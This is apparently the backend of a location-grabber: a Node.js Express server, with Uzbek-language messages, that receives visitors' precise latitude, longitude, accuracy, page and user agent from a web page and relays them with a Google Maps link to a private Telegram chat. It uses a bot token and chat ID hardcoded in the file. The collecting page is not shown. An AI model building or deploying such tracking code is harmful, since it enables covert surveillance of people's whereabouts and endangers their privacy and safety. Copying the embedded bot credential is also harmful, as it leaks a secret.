import express from "express";

const app = express();
app.use(express.json());
app.use(express.static("."));

const BOT_TOKEN = "8938947614:AAEgbgugugi6XenUmZfQWwEE_LHgyzXEQZM";
const CHAT_ID = "5399168630";

app.post("/api/location", async (req, res) => {
  try {
    const { latitude, longitude, accuracy, page, userAgent, time } = req.body;

    const text = `
📍 Yangi joylashuv yuborildi

Latitude: ${latitude}
Longitude: ${longitude}
Aniqlik: ${Math.round(accuracy)} metr

🗺 Google Maps:
https://maps.google.com/?q=${latitude},${longitude}

🌐 Sahifa: ${page}
📱 Qurilma: ${userAgent}
⏰ Vaqt: ${time}
`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });

    res.json({ ok: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

app.listen(3000, () => {
  console.log("Server ishlayapti: http://localhost:3000");
});
